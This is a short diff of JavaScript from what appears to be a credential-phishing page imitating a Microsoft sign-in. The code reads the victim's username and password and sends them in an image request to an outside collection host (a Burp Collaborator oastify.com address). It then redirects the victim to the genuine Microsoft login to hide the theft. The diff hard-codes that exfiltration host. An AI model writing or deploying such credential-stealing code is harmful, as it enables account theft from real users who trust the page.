@@ -148,15 +148,12 @@
       const u = encodeURIComponent(document.getElementById("UserNameText").value);
       const p = encodeURIComponent(document.getElementById("PasswordText").value);
       const protocol = window.location.protocol;
-      
-      const host = // host with valid SSL cert (e.g. burp collaborator 10zd6vqmp4s3uoveqramsqf01r7ivajz.oastify.com) window.location.hostname;
+      const host = '123456789.oastify.com'; // host with valid SSL cert (e.g. burp collaborator)
       // const port = protocol === "https:" ? "9999" : "9998";
+        
       const i = new Image();
       i.src = `${protocol}//${host}/log?u=${u}&p=${p}`;
-    
-      // Optionally hold the image in DOM - Potential for DNS exfil here
-      document.body.appendChild(i);
-    
+        
       // Redirect
       setTimeout(() => {
         window.location.href = "https://login.microsoftonline.com";
